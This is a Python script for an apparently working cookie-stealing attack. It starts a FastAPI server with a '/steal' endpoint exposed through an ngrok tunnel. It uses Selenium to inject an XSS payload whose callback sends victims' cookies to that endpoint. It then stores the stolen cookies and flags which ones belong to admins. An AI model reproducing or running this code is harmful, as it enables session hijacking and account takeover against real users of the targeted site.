from fastapi import FastAPI, Request
import uvicorn
from pyngrok import ngrok, conf
import threading
import time


from selenium_start_point import run_capture_logic, close_driver
from requests_to_selenium import rename, message
from handlers import CreateChain
from context import RequestContext
import json

app = FastAPI()

NGROK_PUBLIC_URL = None
server_thread = None
stop_event = threading.Event()
processed_tokens = set()


def start_ngrok_sync():
    global NGROK_PUBLIC_URL
    try:
        conf.get_default().region = "us"

        tunnels = ngrok.get_tunnels()
        for tunnel in tunnels:
            ngrok.disconnect(tunnel.public_url)
        time.sleep(1)

        tunnel = ngrok.connect(8000, bind_tls=True)
        NGROK_PUBLIC_URL = tunnel.public_url
        print(f"Ngrok tunnel started: {NGROK_PUBLIC_URL}")
        return NGROK_PUBLIC_URL
    except Exception as e:
        print(f"Error starting ngrok: {e}")
        NGROK_PUBLIC_URL = f"Error: {e}"
        return NGROK_PUBLIC_URL


def shutdown_ngrok_sync():
    global NGROK_PUBLIC_URL
    try:
        if NGROK_PUBLIC_URL and not NGROK_PUBLIC_URL.startswith("Error"):
            ngrok.disconnect(NGROK_PUBLIC_URL)
        ngrok.kill()
        print("Ngrok tunnel shutdown")
        NGROK_PUBLIC_URL = None
    except Exception as e:
        print(f"Error shutting down ngrok: {e}")


chain_creator = CreateChain()
setup_handler = chain_creator.create_base_chain()


@app.options("/steal")
async def steal_cookie(request: Request):
    global processed_tokens
    cookie = request.query_params.get("cookie", "No cookie received")
    print(f"Received stolen cookie: {cookie}")

    if cookie in processed_tokens:
        print(f"Token already processed: {cookie}")
        return {"message": "Token already processed"}

    processed_tokens.add(cookie)
    context = RequestContext(cookie=cookie)

    try:

        setup_handler.handle_request(context)

        print(f"Processed and saved cookie: {cookie}")
        return {"message": "Cookie processed", "cookie": cookie}
    except Exception as e:
        print(f"Error processing cookie {cookie}: {e}")

        return {"error": f"Processing error: {str(e)}"}


def run_fastapi_server():
    try:
        uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
    except Exception as e:
        print(f"FastAPI server error: {e}")


def start_server_thread():
    global server_thread, stop_event
    stop_event.clear()
    server_thread = threading.Thread(target=run_fastapi_server, daemon=True)
    server_thread.start()
    print("FastAPI server thread started.")
    return server_thread


def run_complete_logic():
    global NGROK_PUBLIC_URL, driver
    driver = None
    try:
        print("--- Starting Selenium Capture Logic ---")
        driver = run_capture_logic()
        if driver and NGROK_PUBLIC_URL and not NGROK_PUBLIC_URL.startswith("Error"):
            callback_url = f"{NGROK_PUBLIC_URL}/steal?cookie="
            print(f"--- Injecting XSS with callback: {callback_url} ---")
            rename(callback_url)
            print("--- Sending initial message ---")
            message()
            print(
                "--- Selenium Logic Completed (XSS injected, initial message sent) ---"
            )

            return driver, "Selenium logic completed successfully."
        elif not driver:
            return None, "Failed to initialize Selenium driver."
        else:
            return driver, "Ngrok URL not available, cannot inject XSS."
    except Exception as e:
        print(f"CRITICAL ERROR during Selenium logic: {e}")
        if driver:
            close_driver(driver)
        return None, f"Error in Selenium logic: {e}"


def stop_all(driver_instance):
    global stop_event, server_thread
    print("--- Initiating shutdown ---")
    stop_event.set()

    if driver_instance:
        close_driver(driver_instance)
        print("Selenium driver closed.")
    else:
        print("No active Selenium driver to close.")

    shutdown_ngrok_sync()
    print("Ngrok shutdown requested.")

    print("FastAPI server (daemon thread) will stop on application exit.")

    global processed_tokens
    processed_tokens.clear()
    try:
        with open("saved_class_data.json", "w") as f:
            json.dump([], f)
        print("Cleared saved_class_data.json")
    except Exception as e:
        print(f"Could not clear saved_class_data.json: {e}")

    return "Shutdown process initiated."


def get_processed_data():
    try:
        with open("saved_class_data.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, list):
                data = []

        output = []
        for item in data:
            cookie_preview = item.get("cookie", "N/A")[:50] + "..."
            is_admin = item.get("is_admin", "N/A")
            output.append(f"Admin: {is_admin} | Cookie: {cookie_preview}")
        return "\n".join(output) if output else "Пока нет данных."
    except FileNotFoundError:
        return "Файл saved_class_data.json не найден."
    except json.JSONDecodeError:
        return "Ошибка чтения saved_class_data.json (возможно, пустой или поврежден)."
    except Exception as e:
        return f"Ошибка чтения данных: {e}"
